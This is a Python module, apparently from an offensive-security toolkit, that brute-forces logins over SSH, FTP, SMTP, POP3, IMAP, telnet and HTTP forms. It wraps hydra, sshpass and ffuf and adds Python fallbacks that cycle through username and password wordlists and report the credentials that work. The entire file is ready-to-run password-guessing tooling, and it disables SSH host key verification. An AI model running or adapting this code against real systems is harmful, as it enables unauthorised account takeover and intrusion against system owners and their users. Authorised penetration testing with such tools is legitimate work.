"""Auth brute-force strategies: ssh, ftp, http login, smtp, pop3, imap, telnet."""
from __future__ import annotations

import re
import shlex
import socket
from typing import Any, Dict, List, Tuple

from tools.fallback import FallbackRunner
from tools.arsenal_http import PASS_WORDS, USER_WORDS, best_wordlist, http_post

MAX_USERS = 40
MAX_PASS = 120


def _creds(kw: Dict[str, Any]) -> Tuple[List[str], List[str]]:
    users = [u.strip() for u in (kw.get("usernames") or ",".join(USER_WORDS)).split(",") if u.strip()][:MAX_USERS]
    passes = [p.strip() for p in (kw.get("passwords") or ",".join(PASS_WORDS)).split(",") if p.strip()][:MAX_PASS]
    wl = kw.get("wordlist", "")
    if wl and len(passes) < MAX_PASS:
        try:
            with open(wl) as f:
                passes = [l.strip() for l in f if l.strip()][:MAX_PASS]
        except Exception:
            pass
    if not users:
        users = USER_WORDS[:10]
    if not passes:
        passes = PASS_WORDS
    return users, passes


def _hydra(runner: FallbackRunner, kw: Dict[str, Any], service: str, extra: str = "") -> Tuple[bool, str, str]:
    if not runner.tool_available("hydra"):
        return False, "hydra not installed", ""
    host = kw.get("host", "")
    port = kw.get("port", "")
    users, passes = _creds(kw)
    ufile = "/tmp/arsenal_hydra_users.txt"
    pfile = "/tmp/arsenal_hydra_pass.txt"
    with open(ufile, "w") as f:
        f.write("\n".join(users) + "\n")
    with open(pfile, "w") as f:
        f.write("\n".join(passes) + "\n")
    cmd = (f"hydra -L {ufile} -P {pfile} -t 4 -w 15 -f -o /tmp/arsenal_hydra_out.txt "
           f"{('-s ' + shlex.quote(str(port))) if port else ''} {shlex.quote(host)} {service} {extra}")
    res = runner.run_cmd(cmd, timeout=300)
    out = res.get("stdout", "")
    try:
        with open("/tmp/arsenal_hydra_out.txt") as f:
            saved = f.read()
        out = out + "\n" + saved
    except Exception:
        pass
    m = re.findall(r"login:\s*(\S+)\s+password:\s*(\S+)", out, re.I)
    if m:
        found = "; ".join(f"{u}:{p}" for u, p in m)
        return True, f"credentials found: {found}", out[-4000:]
    return False, "no credentials found", out[-2000:]


def _ftp_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    import ftplib
    host = kw.get("host", "")
    port = int(kw.get("port") or 21)
    users, passes = _creds(kw)
    for u in users:
        for p in passes:
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=8)
                try:
                    ftp.login(u, p)
                    banner = ftp.getwelcome()
                    ftp.quit()
                    return True, f"FTP login OK: {u}:{p}", f"{banner}\nCredentials: {u} / {p}"
                except ftplib.error_perm:
                    ftp.close()
            except Exception:
                pass
    return False, "no valid FTP credentials", f"Tried {len(users)}x{len(passes)} combos via ftplib"


def _smtp_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    import smtplib
    host = kw.get("host", "")
    port = int(kw.get("port") or 25)
    users, passes = _creds(kw)
    for u in users:
        for p in passes:
            try:
                s = smtplib.SMTP(host, port, timeout=8)
                s.ehlo()
                try:
                    s.login(u, p)
                    s.quit()
                    return True, f"SMTP login OK: {u}:{p}", f"Credentials: {u} / {p}"
                except smtplib.SMTPAuthenticationError:
                    s.quit()
            except Exception:
                pass
    return False, "no valid SMTP credentials", f"Tried {len(users)}x{len(passes)} combos via smtplib"


def _pop3_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    import poplib
    host = kw.get("host", "")
    port = int(kw.get("port") or 110)
    users, passes = _creds(kw)
    for u in users:
        for p in passes:
            try:
                m = poplib.POP3(host, port, timeout=8)
                try:
                    m.user(u)
                    m.pass_(p)
                    count = len(m.list()[1])
                    m.quit()
                    return True, f"POP3 login OK: {u}:{p}", f"Credentials: {u} / {p} ({count} messages)"
                except poplib.error_proto:
                    m.quit()
            except Exception:
                pass
    return False, "no valid POP3 credentials", f"Tried {len(users)}x{len(passes)} combos via poplib"


def _imap_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    import imaplib
    host = kw.get("host", "")
    port = int(kw.get("port") or 143)
    users, passes = _creds(kw)
    for u in users:
        for p in passes:
            try:
                m = imaplib.IMAP4(host, port, timeout=8)
                try:
                    m.login(u, p)
                    m.logout()
                    return True, f"IMAP login OK: {u}:{p}", f"Credentials: {u} / {p}"
                except imaplib.IMAP4.error:
                    m.logout()
            except Exception:
                pass
    return False, "no valid IMAP credentials", f"Tried {len(users)}x{len(passes)} combos via imaplib"


def _telnet_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    host = kw.get("host", "")
    port = int(kw.get("port") or 23)
    users, passes = _creds(kw)
    for u in users:
        for p in passes:
            try:
                with socket.create_connection((host, port), timeout=8) as s:
                    s.settimeout(8)
                    data = b""
                    try:
                        data = s.recv(1024)
                    except Exception:
                        pass
                    s.sendall((u + "\r\n").encode())
                    time_wait = b""
                    try:
                        time_wait = s.recv(1024)
                    except Exception:
                        pass
                    s.sendall((p + "\r\n").encode())
                    resp = b""
                    try:
                        resp = s.recv(2048)
                    except Exception:
                        pass
                    joined = (data + time_wait + resp).decode("utf-8", "replace").lower()
                    if any(k in joined for k in ("last login", "#", "$", "incorrect", "invalid")):
                        if "incorrect" not in joined and "invalid" not in joined and "failed" not in joined:
                            return True, f"telnet login OK: {u}:{p}", f"Credentials: {u} / {p}"
            except Exception:
                pass
    return False, "no valid telnet credentials", f"Tried {len(users)}x{len(passes)} combos via socket"


def _ssh_paramiko(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    try:
        import paramiko
    except ImportError:
        return False, "paramiko not installed (pip install paramiko)", ""
    host = kw.get("host", "")
    port = int(kw.get("port") or 22)
    users, passes = _creds(kw)
    for u in users:
        for p in passes:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, port=port, username=u, password=p, timeout=8, banner_timeout=8,
                               auth_timeout=8, look_for_keys=False, allow_agent=False)
                client.close()
                return True, f"SSH login OK: {u}:{p}", f"Credentials: {u} / {p}"
            except paramiko.AuthenticationException:
                continue
            except Exception:
                continue
    return False, "no valid SSH credentials", f"Tried {len(users)}x{len(passes)} combos via paramiko"


def _ssh_sshpass(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("sshpass"):
        return False, "sshpass not installed", ""
    host = kw.get("host", "")
    port = kw.get("port") or "22"
    users, passes = _creds(kw)
    for u in users:
        for p in passes:
            res = runner.run_cmd(
                f"sshpass -p {shlex.quote(p)} ssh -p {shlex.quote(str(port))} -o StrictHostKeyChecking=no "
                f"-o ConnectTimeout=6 -o PreferredAuthentications=password -o PubkeyAuthentication=no "
                f"{shlex.quote(u)}@{shlex.quote(host)} 'id' 2>&1", timeout=15)
            out = res.get("stdout", "") + res.get("stderr", "")
            if "uid=" in out:
                return True, f"SSH login OK: {u}:{p}", f"{out.strip()[:500]}\nCredentials: {u} / {p}"
    return False, "no valid SSH credentials via sshpass", ""


def _http_ffuf(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    if not runner.tool_available("ffuf"):
        return False, "ffuf not installed", ""
    url = kw.get("url", "")
    if not url:
        return False, "no url", ""
    u_field = kw.get("username_field", "username")
    p_field = kw.get("password_field", "password")
    users, passes = _creds(kw)
    ufile, pfile = "/tmp/arsenal_bf_users.txt", "/tmp/arsenal_bf_pass.txt"
    with open(ufile, "w") as f:
        f.write("\n".join(users) + "\n")
    with open(pfile, "w") as f:
        f.write("\n".join(passes) + "\n")
    body = f"{u_field}=FUZZUSER&{p_field}=FUZZPASS"
    extra = kw.get("extra_data", "")
    if extra:
        body += "&" + extra.lstrip("&")
    cmd = (f"ffuf -u {shlex.quote(url)} -X POST -H 'Content-Type: application/x-www-form-urlencoded' "
           f"-w {ufile}:FUZZUSER -w {pfile}:FUZZPASS -d {shlex.quote(body)} "
           f"-mc all -fc 401 -fs 0 -t 12 -s -timeout 8 2>&1 | tail -40")
    res = runner.run_cmd(cmd, timeout=200)
    out = res.get("stdout", "").strip()
    hits = [l for l in out.splitlines() if l.strip()]
    if hits:
        return True, f"{len(hits)} candidates (size/status differ from baseline)", "\n".join(hits[:40])
    return False, "no differing responses", out


def _http_py(runner: FallbackRunner, kw: Dict[str, Any]) -> Tuple[bool, str, str]:
    url = kw.get("url", "")
    if not url:
        return False, "no url", ""
    u_field = kw.get("username_field", "username")
    p_field = kw.get("password_field", "password")
    extra = kw.get("extra_data", "")
    users, passes = _creds(kw)
    baseline = http_post(url, f"{u_field}=__probe__&{p_field}=__probe__&{extra}".strip("&"), timeout=8)
    bl_len, bl_status = len(baseline["body"]), baseline["status"]
    found = []
    for u in users:
        for p in passes:
            data = f"{u_field}={u}&{p_field}={p}"
            if extra:
                data += "&" + extra.lstrip("&")
            r = http_post(url, data, timeout=8)
            body = r["body"].lower()
            fail_words = ("invalid", "incorrect", "failed", "error", "wrong", "denied", "not found",
                          "does not exist", "try again", "lockout", "captcha")
            if r["status"] != bl_status and r["status"] not in (0,):
                found.append((u, p, r["status"], len(r["body"])))
                continue
            if r["status"] == 200 and abs(len(r["body"]) - bl_len) > 200 and not any(w in body for w in fail_words):
                found.append((u, p, r["status"], len(r["body"])))
                continue
            if r["status"] in (301, 302, 303, 307, 308) and baseline["status"] not in (301, 302, 303, 307, 308):
                found.append((u, p, r["status"], len(r["body"])))
    if found:
        lines = [f"  {u}:{p} -> {s} (len {l})" for u, p, s, l in found[:20]]
        return True, f"{len(found)} candidate credentials", "Candidates:\n" + "\n".join(lines)
    return False, "no login candidates", "Baseline status/len identical for all combos"


def brute_chain(service: str) -> List[Tuple[str, Any]]:
    if service == "ssh":
        return [("hydra", lambda r, k: _hydra(r, k, "ssh")),
                ("sshpass", _ssh_sshpass),
                ("paramiko", _ssh_paramiko)]
    if service == "ftp":
        return [("hydra", lambda r, k: _hydra(r, k, "ftp")), ("python-ftplib", _ftp_py)]
    if service == "smtp":
        return [("hydra", lambda r, k: _hydra(r, k, "smtp")), ("python-smtplib", _smtp_py)]
    if service == "pop3":
        return [("hydra", lambda r, k: _hydra(r, k, "pop3")), ("python-poplib", _pop3_py)]
    if service == "imap":
        return [("hydra", lambda r, k: _hydra(r, k, "imap")), ("python-imaplib", _imap_py)]
    if service == "telnet":
        return [("hydra", lambda r, k: _hydra(r, k, "telnet")), ("python-telnet", _telnet_py)]
    if service == "http":
        return [("ffuf", _http_ffuf), ("hydra", lambda r, k: _hydra(r, k, "http-post-form",
                f"'{kw_http_form(k)}'")), ("python-http", _http_py)]
    return [("python", lambda r, k: (False, f"unknown service {service}", ""))]


def kw_http_form(kw: Dict[str, Any]) -> str:
    """Build hydra http-post-form argument from kwargs."""
    url = kw.get("url", "")
    u_field = kw.get("username_field", "username")
    p_field = kw.get("password_field", "password")
    extra = kw.get("extra_data", "")
    body = f"{u_field}=^USER^&{p_field}=^PASS^"
    if extra:
        body += "&" + extra.lstrip("&")
    failed = kw.get("failed_phrase", "invalid")
    return f"{url}:{body}:{failed}"
